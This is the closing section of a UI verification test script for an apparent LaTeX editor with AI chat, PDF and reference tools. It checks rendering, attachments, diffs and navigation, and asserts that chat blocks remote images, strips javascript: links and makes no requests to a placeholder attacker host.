      throw new Error("the AskUserQuestion card (options, header chip, Skip, Other…) did not render");
    }
    if (!askRestoredOk) {
      throw new Error("reloading mid-question did not restore an actionable question card");
    }
    if (!askAnsweredOk) {
      throw new Error("answering the question did not produce a reply echoing the chosen label");
    }
    if (!askCollapsedOk) {
      throw new Error("the answered question card did not collapse to its muted summary");
    }
    if (!askSkipEchoOk) {
      throw new Error("skipping the question did not deliver the declined tool result to the model");
    }
    if (!imgPasteThumbOk) {
      throw new Error("pasting an image into the composer did not show a labelled thumbnail with its remove ×");
    }
    if (!imgRemoveOk) throw new Error("removing a pending attachment did not clear the thumbnail row");
    if (!imgSentToModelOk) {
      throw new Error(`the model received no image_url part with the pasted bytes: ${JSON.stringify(sentImages)}`);
    }
    if (!imgComposerClearedOk) throw new Error("sending did not clear the composer's attachments");
    if (!imgBubbleOk) throw new Error("the user bubble did not render the attached image at its real size");
    if (!imgDialogOk) throw new Error("clicking a chat thumbnail did not open the full-size image dialog");
    if (!imgRestoredOk) throw new Error("the attached image did not survive a reload of the transcript");
    if (!imgNoDiffOk) throw new Error("a chat image leaked into the project's review diff");
    if (!dropRejectOk) {
      throw new Error("dropping a non-image did not preventDefault (tab would navigate) or showed no reason");
    }
    if (!uploadFailKeepsDraftOk) {
      throw new Error("a failed image upload discarded the typed message and its attachments");
    }
    if (!imageOnlyEnabledOk) throw new Error("Send stayed disabled for an image-only message");
    if (!imageOnlySentOk) throw new Error("an image-only message never reached the model");
    if (!busyDropOk) {
      throw new Error("dropping a file mid-turn did not preventDefault (tab would navigate) or said nothing");
    }
    if (!attachmentsClearedOnSwitchOk) {
      throw new Error("composer attachments survived a project switch — they would upload into the wrong project");
    }
    if (!sourceQuoteChipOk || !sourceQuoteDraftOk) {
      throw new Error("quoting a selection from the Source editor did not reach the chat draft with its file:line");
    }
    if (!pdfSearchOk) {
      throw new Error(`find-in-PDF reported no usable match count: ${JSON.stringify(pdfSearchCount)}`);
    }
    if (!pdfSearchMissOk) {
      throw new Error("find-in-PDF did not report 'no hits' for a query that does not occur");
    }
    if (!proofJumpOk) {
      throw new Error("the Proof hunk's ↗ did not open the changed line in the Source editor");
    }
    if (!crossPageQuoteOk) {
      throw new Error("a PDF selection spanning two pages did not offer the quote chip / reach the composer");
    }
    if (!auditBadgeOk) {
      throw new Error("the flagged citation did not show its mismatch badge in Refs");
    }
    if (!fixOnlyOnFlaggedOk) {
      throw new Error("a verified citation offered a 'fix' button — repairs must be offered only for flagged entries");
    }
    if (!fixPromptOk) {
      throw new Error(`the Refs fix button sent an incomplete repair prompt: ${JSON.stringify(fixPrompt.slice(0, 300))}`);
    }
    if (!fixChatVisibleOk) {
      throw new Error("the repair turn was started without bringing chat into view");
    }
    if (!askSkippedCollapsedOk) {
      throw new Error("the skipped question card did not collapse to its muted 'skipped' summary");
    }
    if (!mdStrongOk) throw new Error("markdown **bold** did not render as a <strong> element");
    if (!mdInlineMathOk) {
      throw new Error(`inline $…$ math did not render through KaTeX (inline count ${mdMath.inline})`);
    }
    if (!mdDisplayMathOk) {
      throw new Error(`display $$…$$ math did not render through KaTeX (display count ${mdMath.display})`);
    }
    if (!mdNoRawOk) {
      throw new Error("raw '$d(v)$' or '**bold text**' markers stayed visible outside code");
    }
    if (!mdCodeLiteralOk) {
      throw new Error("the fenced code block lost its literal $x$/** markers");
    }
    if (!mdCurrencyOk) {
      throw new Error("'this costs $5 in total' was not left as plain text by remark-math");
    }
    if (!f1NoImgOk) {
      throw new Error("a remote image rendered as a fetching element (img[src^=http] or a preload hint)");
    }
    if (!f1ChipOk) throw new Error("the blocked remote image did not render its alt+host chip");
    if (!f1JsLinkOk) throw new Error("a javascript: link kept its href (or the link text vanished)");
    if (!f1NoRequestOk) {
      throw new Error(`the chat issued network requests to attacker.example: ${attackerRequests.join(", ")}`);
    }
    if (!f2PreservedOk) throw new Error("the unpaired \\[4pt] lookalike swallowed prose around it");
    if (!f2DisplayOk) throw new Error("the real \\[x=1\\] line did not render as display math");
    if (!f3IndentedOk) throw new Error("the indented code block lost its literal \\(x\\)");
    if (!f4ListOk) {
      throw new Error("the $$…$$ line inside a list item split the list (or dropped its display math)");
    }
    if (!linkRenderedOk) {
      throw new Error("`main.tex:3` did not render as a file link inside its code span");
    }
    if (!plainNonexistentOk) throw new Error("nonexistent.tex:9 did not stay plain text");
    if (!linkJumpOk) {
      throw new Error("clicking the main.tex:3 link did not reveal+flash line 3 in the Source pane");
    }
    if (!quoteActionOk) throw new Error("the assistant blockquote shows no 'find in source' action");
    if (!noPdfActionOk) throw new Error("'find in PDF' was offered while no PDF pane was visible");
    if (!quoteJumpOk) {
      throw new Error("'find in source' did not reveal the quoted passage (main.tex line 8)");
    }
    if (!pdfFindOk) throw new Error("'find in PDF' did not highlight the passage in the PDF text layer");
    if (canvases < 1) throw new Error("PDF viewer rendered no pages");
    if (downloads > 0) throw new Error("PDF triggered a browser download — must render inline");
    if (Math.abs(widthAfter - widthBefore) < 100) throw new Error("panel resize had no effect");
    if (!scopeChipOk) throw new Error("scope summary did not reflect the checked file");
    if (!scopeCleared) throw new Error("scope chip did not clear");
    if (!rejectFileUiOk) {
      throw new Error("discarding one file did not remove only that file's diff from the proof");
    }
    if (!rejectFileContentOk) {
      throw new Error("reject-file did not revert the discarded file (or clobbered the other one)");
    }
    if (!rejectHunkContentOk) throw new Error("reject-hunk did not revert the hunk's change on disk");
    if (!leaveWarnShownOk) {
      throw new Error(
        "leaving with unapproved changes did not open the confirm naming the project and file count",
      );
    }
    if (!leaveWarnStayOk) throw new Error("'Stay' did not keep the project view with its pending proof");
    if (!leaveWarnLeaveOk) throw new Error("'Go to dashboard' did not navigate to the dashboard");
    if (!leaveUnloadArmedOk) {
      throw new Error("beforeunload guard was not armed while unapproved changes were pending");
    }
    if (!leaveUnloadClearedOk) {
      throw new Error("beforeunload guard did not disarm once the pending changes were gone");
    }
    if (!refChipLeaf) throw new Error("cited entry's key chip is not leaf-green");
    if (!citeJumpOk) throw new Error("usage jump did not reveal the cite line in the Source tab");
    if (!addProofOk) throw new Error("adding a reference showed no sections/refs.bib diff in the Proof");
    if (!newChipGold) throw new Error("uncited new entry's key chip is not gold/amber");
    if (!unusedBadgeOk) throw new Error("new entry does not show the unused badge");
    if (!editProofOk) throw new Error("editing the reference did not update the proof diff");
    if (!refsBibRestored) throw new Error("deleting the reference did not restore refs.bib to its pre-add state");
    if (!diffToggleOk) throw new Error("Proof did not show the Text diff | Rendered diff toggle");
    if (!renderedChipsOk) {
      throw new Error("rendered diff did not list the changed page (no 'Changed page 3' chip)");
    }
    if (!renderedOnlyP3) {
      throw new Error("rendered diff flagged unchanged pages (1 or 2) as changed");
    }
    if (!renderedBoxesOk) throw new Error("rendered diff drew no region boxes on the changed page");
    if (!renderedRestoredOk) {
      throw new Error("discarding after the rendered diff did not restore main.tex");
    }
    if (!localFilesOk) throw new Error("local project files did not appear in the Source tab");
    if (!publishOk) throw new Error("mock Overleaf did not receive the published project files");
    if (publishedRow < 1) throw new Error("published project did not appear under the account");
    if (!sideBySideOk) {
      throw new Error("source (left pane) and PDF (right pane) were not visible side by side");
    }
    if (!swapOk) throw new Error("selecting the right pane's view on the left did not swap the panes");
    if (textLayerSpans < 1) throw new Error("PDF page 1 has no .textLayer spans over the canvas");
    if (!textLayerSelectable) {
      throw new Error("programmatic selection over the PDF text layer yielded no text");
    }
    if (!dblclickJumpOk) {
      throw new Error("double-clicking a PDF word did not reveal the matching .tex line in the Source pane");
    }
    if (!quoteInDraftOk) {
      throw new Error("the quote chip did not inject the PDF selection into the chat composer draft");
    }
    if (!cardGridOk) throw new Error("dashboard card grid did not render the imported project card");
    if (!wordmarkNavOk) throw new Error("wordmark did not navigate project → dashboard");
    if (!customDialogOk) {
      throw new Error("remove-project did not show the styled in-app confirm dialog (or Cancel lost the card)");
    }
    if (!unofficialNoticeOk) {
      throw new Error(
        "the unofficial-API notice did not show for overleaf.com (or stayed for the mock host)",
      );
    }
    if (!tablistOk) {
      throw new Error("pane strips are not tablists with aria-selected on the active tab");
    }
    if (!reducedMotionOk) throw new Error("built CSS lost its prefers-reduced-motion fallbacks");
    if (!keyboardResizeOk) {
      throw new Error("the pane separator is not keyboard-resizable (focus + ArrowLeft)");
    }
    if (!dialogEscapeOk) throw new Error("Escape did not cancel the confirm dialog");
    console.log(`✅ UI verify finished — screenshots in ${SHOTS}`);
  } finally {
    await browser?.close().catch(() => {});
    server.kill();
    await mock.close();
    await askMock.close();
    rmSync(dataDir, { recursive: true, force: true });
  }
}

main().catch((err) => {
  console.error("❌ UI VERIFY FAILED:", err);
  process.exit(1);
});
